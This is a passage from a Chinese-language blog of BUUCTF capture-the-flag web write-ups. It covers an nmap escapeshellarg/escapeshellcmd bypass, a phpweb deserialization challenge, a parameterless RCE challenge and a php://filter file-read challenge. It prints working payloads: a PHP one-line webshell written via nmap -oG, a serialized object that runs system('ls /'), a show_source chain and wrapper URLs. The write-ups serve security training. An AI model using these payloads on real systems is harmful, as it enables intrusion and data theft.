<span class="comment">// --host-time限制扫描时间</span></span><br><span class="line">    <span class="comment">// -F，快速扫描</span></span><br></pre></td></tr></table></figure><p>这里命令的本意是让用户输入一个<code>IP</code>或者网址, 然后后台使用<code>nmap</code>对其进行扫描</p><p>因为<code>$host</code>最终会被拼接到<code>system</code>函数中,所以这里我们可以通过能够控制的<code>$host</code>变量来执行命令. 一般的思路是命令后注入的形式,例如<code>host</code>的值可以为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp; cat /flag</span><br></pre></td></tr></table></figure><p>但是这里由于<code>escapeshellarg</code>和<code>escapeshellcmd</code>的存在, 上面这样的命令会被引号括起来,同时<code>&amp;</code>这样的特殊符号也会在前面被加上<code>\</code>而转义(由具有逻辑意义的符号变为纯文本字符)</p><p>所以需要从其他角度来考虑如何执行命令,这里<code>Nmap</code>的 <code>-oG</code> 功能可以把执行结果输出到文件中, 那么这里就可以在<code>host</code>参数中写入一句话木马, 并通过<code>Namp</code>的输出功能将含有一句话木马代码的执行结果输出到文件中</p><p>输出文件的路径代码里也给出来了, 目录名也就是<code>sandbox</code>这个变量的值</p><p>那么不考虑<code>escapeshellarg</code>和<code>escapeshellcmd</code>的话,payload可以为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?host=&lt;?php eval($_POST[a])?&gt; -oG a.php</span><br><span class="line">这样最终执行的命令就是:</span><br><span class="line">system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &lt;?php eval($_POST[a])?&gt; -oG a.php&quot;);</span><br></pre></td></tr></table></figure><p>但是<code>escapeshellarg</code>和<code>escapeshellcmd</code>会对传入字符串中的特殊字符进行转义,以保证传入<code>shell</code>的参数字符串是安全的</p><p>其中<code>escapeshellarg</code>会在未配对的单引号前面加上<code>\</code>,然后再在转义后的<code>\&#39;</code>两段再加上一对单引号,最后再在整个字符串的两端加上一对单引号</p><p><code>escapeshellcmd</code>会在下列特殊字符(包括<code>/</code>)以及不成对的单引号前面加上<code>\</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">：`&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\`、`\x0A` 和 `\xFF`。</span><br></pre></td></tr></table></figure><p>这两者单独使用都没有问题,而当对一个字符串先使用<code>escapeshellarg</code>在使用<code>escapeshellcmd</code>处理时,就会出现漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host1</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host2</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host3</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host1</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host1</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host2</span>;</span><br><span class="line">    <span class="variable">$d</span> = <span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host3</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">?host=&lt;?php eval($_POST[a])?&gt; -oG a.php 时输出:</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &lt;?php eval($_POST[a])?&gt; -oG a.php</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php&#x27;</span></span><br><span class="line"><span class="comment">此时命令无法正确执行</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">?host=&lt;?php eval($_POST[a])?&gt; -oG a.php&#x27; 时输出:</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &lt;?php eval($_POST[a])?&gt; -oG a.php&#x27;</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php&#x27;\\&#x27;&#x27;\&#x27;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">?host=&#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php&#x27;时输出:</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php&#x27;</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php&#x27;\\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">?host=&#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php &#x27;时输出(最后的引号前多了一个空格)</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php &#x27;</span></span><br><span class="line"><span class="comment">$b: nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\&#x27;&#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php&#x27;\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">$c: nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php&#x27;</span></span><br><span class="line"><span class="comment">$d: nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php &#x27;\\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">这里最后我们输入的这部分字符串实际上被分成了三部分, 前面的&#x27;&#x27;\\&#x27;&#x27;, 中间的主体部分,后面的&#x27;\\&#x27;&#x27;&#x27;. 后面这部分和主体部分中间使用空格分开了,所以不会对命令的执行造成影响.</span></span><br><span class="line"><span class="comment">对比这里的$b和$d, $b最外层还是有一对单引号包裹了整个字符串的,而$d中,由于前面和后面各多出了一个\,导致$d中主体部分前面和后面的单引号不再产生关联.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>那么最后的<code>payload</code>(用单引号包裹,同时后面的单引号前面加一个空格)</p><p>这里<code>escapeshellarg</code>和<code>escapeshellcmd</code>的共用实际上是帮助我们逃脱了原本<code>escapeshellarg</code>在字符串两侧加的那一对单引号的控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php &#x27;</span><br><span class="line">网页输出: 执行成功</span><br><span class="line">you are in sandbox d59f507b1cb8dcb30bc5499203a99ac3Starting Nmap 7.70 ( https://nmap.org ) at 2022-10-19 03:07 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 0.83 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 0.83 seconds</span><br></pre></td></tr></table></figure><p>使用蚁剑连接后在根目录找到flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8e45810b-81c1-4484-8dd3-e42274c1394c.node4.buuoj.cn:81/d59f507b1cb8dcb30bc5499203a99ac3/a.php</span><br></pre></td></tr></table></figure><p>另外,其实如果能猜到flag的路径的话,payload直接这样写也可以:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: date(): It is not safe to rely on the system&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br><span class="line">2022-10-19 06:41:06 am</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019144853752-166704781973599.png" alt="image-20221019144853752" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=date&amp;p=Y-m-d+h:i:s+a</span><br></pre></td></tr></table></figure><p>这里<code>func</code>的值改成别的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=a&amp;p=Y-m-d+h:i:s+a</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019150119174-1667047819735100.png" alt="image-20221019150119174" style="zoom:67%;" /><p>这里是调用了<code>call_user_func()</code>函数, 用来调用其他函数,其第一个参数是被调用的函数名, 后面的参数是要传给这个被调用函数的参数</p><p><code>show_source</code>函数被过滤了</p><img src="/images/buuctf-web/image-20221019150406768.png" alt="image-20221019150406768" style="zoom:80%;" /><p>尝试<code>highlight_file</code>: 成功输出了<code>index.php</code>的源码</p><img src="/images/buuctf-web/image-20221019150655094-1667047819735101.png" alt="image-20221019150655094" style="zoom:67%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="comment">//被禁用的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>); <span class="comment">//漏洞在这里,这里$func是用户可控的,所以可以执行用户的命令</span></span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>); <span class="comment">//func转为小写字母</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123; <span class="comment">//检查func中是否为禁用函数</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>); <span class="comment">//调用gettime</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里看到有定义<code>Test</code>类,并且有<code>__destruct</code>魔术方法,可能会用到<strong>反序列化</strong>. 同时注意到,这里如果通过<code>Test</code>类的<code>__destruct</code>来执行<code>func</code>的话,可以绕过黑名单的检测</p><p><strong>那么现在的思路就是给网站直接传的参数中,<code>func</code>传反序列化函数<code>unserialize</code>,<code>p</code>传一个待反序列化的字符串</strong></p><p><strong>然后后台通过<code>call_user_func</code>执行反序列化时,又会调用<code>__destruct</code>魔术方法</strong></p><p><strong>从而解析类属性中的<code>func</code>和<code>p</code>并执行,而此处的<code>func</code>(也就是我们通过构造待反序列化的字符串传的<code>func</code>)是不受黑名单控制的</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先扫描一下根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019152637740-1667047819735102.png" alt="image-20221019152637740" style="zoom:67%;" /><p>扫描<code>/tmp</code>目录,发现flag文件</p><img src="/images/buuctf-web/image-20221019152724140-1667047819735104.png" alt="image-20221019152724140" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221019152813806-1667047819735103.png" alt="image-20221019152813806" style="zoom:67%;" /><br><hr><br><h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>进来看源码,抓包,啥也没有</p><img src="/images/buuctf-web/image-20221019160827439.png" alt="image-20221019160827439" style="zoom:67%;" /><p>那就扫目录吧:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u &quot;http://6cfa03fc-73cc-475a-a1d3-cede7532f1cd.node4.buuoj.cn:81/&quot; --delay=1</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019161053431-1667047819735105.png" alt="image-20221019161053431" style="zoom:67%;" /><p>发现了<code>/.git</code>目录,<strong>存在<code>git</code>泄露,通过<code>Githack</code>工具来利用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(kali上):</span><br><span class="line">python3 GitHack.py http://6cfa03fc-73cc-475a-a1d3-cede7532f1cd.node4.buuoj.cn:81/.git/</span><br></pre></td></tr></table></figure><p>成功下载了<code>index.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">//禁用了伪协议</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">//在参数3中匹配参数1,将匹配到的内容替换为参数2</span></span><br><span class="line">            <span class="comment">//?R的意思是递归</span></span><br><span class="line">            <span class="comment">//这里参数一的正则表达式用来匹配 abc(bcd()),abc(bcd(def())) (后面还能无限递归嵌套) 这样的字符串</span></span><br><span class="line">            <span class="comment">//匹配到后将其替换为空,所以如果exp传了 a(b(c())); 替换之后就只剩下一个分号,才能使整个表达式为TRUE</span></span><br><span class="line">            <span class="comment">//所以这里很显然是需要进行无参数的RCE了</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>无参数RCE:</p><p>读取当前目录: 这里<code>getcwd</code>函数被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019175758566.png" alt="image-20221019175758566" style="zoom:67%;" /><p><strong>flag就在当前目录下,那么可以通过<code>array_reverse</code>将数组逆序,然后<code>next</code>取到下一个成员,也就是<code>flag.php</code>,最后通过<code>show_source</code>来读取就可以了.</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(show_source(next(array_reverse(scandir(pos(localeconv()))))));</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019180018891.png" alt="image-20221019180018891" style="zoom:67%;" /><br><hr><br><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php   </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一步,让<code>text</code>参数从<code>data</code>协议的数据流中读数到”I have a dream”即可,然后<code>file</code>参数使用<code>php</code>伪协议来输出<code>base64</code>编码后的<code>next.php</code>源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9c3638f1-e9c9-4e78-8982-bd06c9f37d47.node4.buuoj.cn:81/?text=next.php&amp;text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p>将输出解码得到<code>next.php</code>的源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这里<code>preg_replace</code>函数中, 